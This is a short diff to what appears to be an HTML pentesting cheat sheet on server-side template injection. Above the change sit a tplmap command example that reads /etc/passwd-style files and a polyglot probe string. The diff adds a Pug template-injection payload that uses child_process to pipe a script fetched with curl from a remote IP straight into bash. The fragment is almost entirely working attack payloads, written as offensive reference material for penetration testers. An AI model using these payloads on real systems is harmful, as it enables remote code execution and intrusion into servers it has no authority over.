@@ -1944,6 +1944,9 @@ Example usage: tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/p
 ${{<%[%'"}}%\
 
 #https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+## Pug <= v3.0.2
+    #{7*7} = 49
+    #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}
 </code></pre></div></div>
 </div>
 <h3 id="tab-nabbing">Tab Nabbing</h3>
